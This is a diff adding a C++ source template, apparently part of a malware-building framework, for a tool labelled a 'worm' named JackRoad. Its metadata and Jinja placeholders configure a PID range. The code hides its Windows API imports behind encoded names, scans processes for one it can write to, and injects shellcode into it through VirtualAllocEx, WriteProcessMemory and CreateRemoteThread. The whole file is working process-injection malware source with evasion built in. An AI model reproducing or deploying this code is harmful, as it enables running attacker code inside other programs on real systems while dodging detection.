@@ -1,0 +1,328 @@
+#!name##JackRoad
+#!types##worm
+#!info##A worm written in C++ designed for testing shellcode. It scans processes within a specified PID range, locates a vulnerable target, injects, and executes the shellcode. It does not use the windows.h header; instead, all functions are imported dynamically through a custom library. The worm displays detailed information about the target process, allocated memory, and other relevant injection data.
+#!lang##cpp
+#!system_FLAG##[W]
+#!globalVar##COMPILER##mingw-x64-cpp##The name of the compiler to build the executable file.
+#!globalVar##NO_DLL##True##No debug symbols etc.
+#!banned##module##starter##shadow##junk
+#!processWorm##WormLib
+#!reqSMod##DuckTales
+#!include##SC_Storage_cpp##sc_storage.cpp
+#!reqVar##JR_start##Start PID process##int
+#!setVar##JR_start##2000##int
+#!reqVar##JR_last##Last PID process##int
+#!setVar##JR_last##8000##int
+
+
+
+
+
+#include <iostream>
+#include <cstddef>
+#include <vector>
+#include "sc_storage.h"
+
+#define PROCESS_ALL_ACCESS 0x1F0FFF
+#define FALSE 0
+#define MEM_COMMIT_RESERVE 0x00003000
+#define PAGE_EXECUTE_READWRITE 0x40
+
+
+typedef unsigned int u32; // uint32_t
+typedef int BOOL;    // BOOL
+typedef void* HANDLE; // HANDLE
+typedef unsigned int DWORD;     // DWORD
+typedef void* LPVOID;   // LPVOID
+
+
+// Function pointer - prefix 'wp'
+typedef void (__stdcall* wpSleep)(unsigned int);
+typedef HANDLE (__stdcall* wpOpenProcess)(DWORD, BOOL, DWORD);
+typedef DWORD (__stdcall* wpGetLastError)();
+typedef LPVOID (__stdcall* wpVirtualAllocEx)(HANDLE, LPVOID, size_t, DWORD, DWORD);
+typedef BOOL (__stdcall* wpWriteProcessMemory)(HANDLE, LPVOID, const void*, size_t, size_t*);
+typedef HANDLE (__stdcall* wpCreateRemoteThread)(HANDLE, void*, size_t, unsigned int (__stdcall*)(void*), LPVOID, DWORD, unsigned int*);
+
+//DuckTales functions
+extern "C" void DuckStartTales();
+extern "C" const char* DuckIntro();
+extern "C" void* DuckGetAddr(const char* name);
+extern "C" void* DuckGet(u32* fname, u32* dll_name);
+extern "C" void* DuckShow(u32* text);
+
+
+{% set DUCK_TBASE = TOOL.AsmSh_make_table(data=DT_text, set_as_default=True) %}
+
+class JackRoad
+{
+    private:
+        //encoded functions name. Prefix: 'en_'
+        u32 en_Sleep[20] = {
+            {{TOOL.AsmSh_encode("Sleep")}}
+            }; // Sleep
+        u32 en_GetLastError[20] = {
+            {{TOOL.AsmSh_encode("GetLastError")}}
+        }; // GetLastError
+        u32 en_OpenProcess[20] = {
+            {{TOOL.AsmSh_encode("OpenProcess")}}
+        };    // OpenProcess
+        u32 en_VirtualAllocEx[20] = {
+            {{TOOL.AsmSh_encode("VirtualAllocEx")}}
+        }; // VirtualAllocEx
+        u32 en_WriteProcessMemory[20] = {
+            {{TOOL.AsmSh_encode("WriteProcessMemory")}}
+        }; //WriteProcessMemory
+        u32 en_CreateRemoteThread[20] = {
+            {{TOOL.AsmSh_encode("CreateRemoteThread")}}
+        }; // CreateRemoteThread
+        unsigned char test_byte = 0x90;
+
+
+    public:
+        int pid_start = {{JR_start}};
+        int pid_stop = {{JR_last}};
+        HANDLE working_process = nullptr;
+        Storage sc_storage;
+        unsigned char* shellcode = nullptr;
+        // function address
+        wpSleep addrSleep = nullptr;
+        wpOpenProcess addrOpenProcess = nullptr;
+        wpGetLastError addrGetLastError = nullptr;
+        wpVirtualAllocEx addrVirtualAllocEx = nullptr;
+        wpWriteProcessMemory addrWriteProcessMemory = nullptr;
+        wpCreateRemoteThread addrCreateRemoteThread = nullptr;
+
+        JackRoad() {
+            std::cout << "JackRoad init" << std::endl;
+            build();
+            
+        }
+
+        void build() {
+            DuckStartTales();
+            // get Sleep function
+            void *rawSleep = DuckGet(en_Sleep, nullptr);
+            addrSleep = (wpSleep)rawSleep;
+            // get OpenProcess function
+            void *rawOpenProcess = DuckGet(en_OpenProcess, nullptr);
+            addrOpenProcess = (wpOpenProcess)rawOpenProcess;
+            // get GetLastError function
+            void *rawGetLastError = DuckGet(en_GetLastError, nullptr);
+            addrGetLastError = (wpGetLastError)rawGetLastError;
+            // get VirtualAllocEx function
+            void *rawVAE = DuckGet(en_VirtualAllocEx, nullptr);
+            addrVirtualAllocEx = (wpVirtualAllocEx)rawVAE;
+            // get WriteProcessMemory function
+            void *rawWPM = DuckGet(en_WriteProcessMemory, nullptr);
+            addrWriteProcessMemory = (wpWriteProcessMemory)rawWPM;
+            // get CreateRemoteThread function
+            void *rawCMT = DuckGet(en_CreateRemoteThread, nullptr);
+            addrCreateRemoteThread = (wpCreateRemoteThread)rawCMT;
+        }
+
+        void getLastError() {
+            std::cout << "ERROR ID: " << addrGetLastError() << std::endl;
+        }
+
+        void sleep(int time) {
+            addrSleep(time);
+        }
+
+        HANDLE openProcess(int pid) {
+            HANDLE proc_handle = addrOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+            return proc_handle;
+        }
+
+        HANDLE openProcess2(int pid) {
+            std::cout << "Try open process PID: " << pid << std::endl;
+            HANDLE proc_handle = openProcess(pid);
+            if (proc_handle == 0) {
+                std::cout << "ERROR: open process PID: " << pid << std::endl;
+                getLastError();
+                return 0;
+            }
+            else {
+                std::cout << "Open process pid: " << pid << " successfull." << std::endl;
+                return proc_handle;
+            }
+        }
+
+        LPVOID virtualAllocEx(HANDLE process_handle) {
+            LPVOID addr = addrVirtualAllocEx(process_handle, nullptr, sc_storage.size, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);
+            return addr;
+        }
+
+        LPVOID virtualAllocEx(HANDLE process_handle, int mem_size) {
+            LPVOID addr = addrVirtualAllocEx(process_handle, nullptr, mem_size, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);
+            return addr;
+        }
+
+        LPVOID virtualAllocEx2(HANDLE process_handle) {
+            LPVOID addr = virtualAllocEx(process_handle);
+            if (addr == nullptr) {
+                std::cout << "ERROR: allocate memory in process" << std::endl;
+                getLastError();
+                return 0;
+            }
+            else {
+                std::cout << "Allocate memory successfull. Address: " << addr << ". Allocated: " << sc_storage.size << " bytes." << std::endl;
+                return addr;
+            }
+        }
+
+        LPVOID virtualAllocEx2(HANDLE process_handle, int mem_size) {
+            LPVOID addr = virtualAllocEx(process_handle, mem_size);
+            if (addr == nullptr) {
+                std::cout << "ERROR: allocate memory in process" << std::endl;
+                getLastError();
+                return 0;
+            }
+            else {
+                std::cout << "Allocate memory successfull. Address: " << addr << ". Allocated: " << sc_storage.size << " bytes." << std::endl;
+                return addr;
+            }
+        }
+
+        BOOL writeProcessMemory(HANDLE process_handle, LPVOID mem_addr) {
+            std::vector<unsigned char> sc = sc_storage.getSCode();
+            BOOL out = addrWriteProcessMemory(process_handle, mem_addr, sc.data(), sc_storage.size, nullptr);
+            return out;
+        }
+
+        BOOL writeProcessMemory(HANDLE process_handle, LPVOID mem_addr, void* data, int data_size) {
+            BOOL out = addrWriteProcessMemory(process_handle, mem_addr, data, data_size, nullptr);
+            return out;
+        }
+
+
+        BOOL writeProcessMemory2(HANDLE process_handle, LPVOID mem_addr) {
+            std::cout << "Try write memory in process..." << std::endl;
+            BOOL out = writeProcessMemory(process_handle, mem_addr);
+            if (out == 0) {
+                std::cout << "ERROR: Write memory." << std::endl;
+                getLastError();
+                return 0;
+            }
+            else {
+                std::cout << "Successfull write memory in process" << std::endl;
+                return 1;
+            }
+        }
+
+        BOOL writeProcessMemory2(HANDLE process_handle, LPVOID mem_addr, void* data, int data_size) {
+            BOOL out = writeProcessMemory(process_handle, mem_addr, data, data_size);
+            if (out == 0) {
+                std::cout << "ERROR: Write memory." << std::endl;
+                getLastError();
+                return 0;
+            }
+            else {
+                std::cout << "Successfull write memory in process" << std::endl;
+                return 1;
+            }
+        }
+
+        HANDLE createRemoteThread(HANDLE process_handle, LPVOID mem_addr) {
+            HANDLE th = addrCreateRemoteThread(process_handle, nullptr, 0, (unsigned int (__stdcall*)(void*))mem_addr, nullptr, 0, nullptr);
+            return th;
+        }
+
+        HANDLE createRemoteThread2(HANDLE process_handle, LPVOID mem_addr) {
+            std::cout << "Try start thread..." << std::endl;
+            HANDLE th = createRemoteThread(process_handle, mem_addr);
+            if (th == 0) {
+                std::cout << "ERROR: start thread." << std::endl;
+                getLastError();
+                return 0;
+            }
+            else {
+                std::cout << "Start threading successfull" << std::endl;
+                return th;
+            }
+        }
+
+        HANDLE checkProcess(int pid) {
+            HANDLE proch = openProcess(pid);
+            if (proch == nullptr) {
+                return 0;
+            }
+            LPVOID addr = virtualAllocEx(proch, 1);
+            if (addr == 0) {
+                return 0;
+            }
+            BOOL out = writeProcessMemory(proch, addr, &test_byte, 1);
+            if (out == 0) {
+                return 0;
+            }
+            else {
+                return proch;
+            }
+        }
+
+        HANDLE findVulProcess() {
+            int reset = 0;
+            std::cout << "Finding vul process...." << std::endl;
+            for (int i=pid_start; i<=pid_stop; i++) {
+                printf("[%d]  ", i);
+                HANDLE proch = checkProcess(i);
+                if (proch != 0) {
+                    std::cout << "\nFind vulnerable process PID: " << i << std::endl;
+                    return proch;
+                }
+                reset++;
+                if (reset == 9) {
+                    std::cout << std::endl;
+                    reset = 0;
+                }
+            }
+            return 0;
+        }
+
+        void inject(HANDLE process_handle) {
+            LPVOID addr = virtualAllocEx2(process_handle);
+            BOOL out = writeProcessMemory2(process_handle, addr);
+            if (out != 0) {
+                HANDLE th = createRemoteThread2(process_handle, addr);
+            }
+        }
+
+        void injectTo(int pid) {
+            HANDLE vp = checkProcess(pid);
+            if (vp != 0) {
+                inject(vp);
+            }
+        }
+
+        void injectTo2(int pid) {
+            std::cout << "Check if process: " << pid << " is vulnerable..." << std::endl;
+            HANDLE vp = checkProcess(pid);
+            if (vp == 0) {
+                std::cout << "------ ERROR -------" << std::endl;
+                getLastError();
+            }
+            else {
+                inject(vp);
+            }
+
+        }
+
+        void work() {
+            HANDLE vp = findVulProcess();
+            if (vp != 0) {
+                inject(vp);
+            }
+        }
+
+
+        
+};
+
+int main() {
+    std::cout << "START PROGRAM" << std::endl;
+    JackRoad jackRoad;
+    jackRoad.sleep(2000);
+    jackRoad.work();
+    std::cout << "EXIT PROGRAM. PRESS ENTER." << std::endl;
+    std::cin.get();
+}
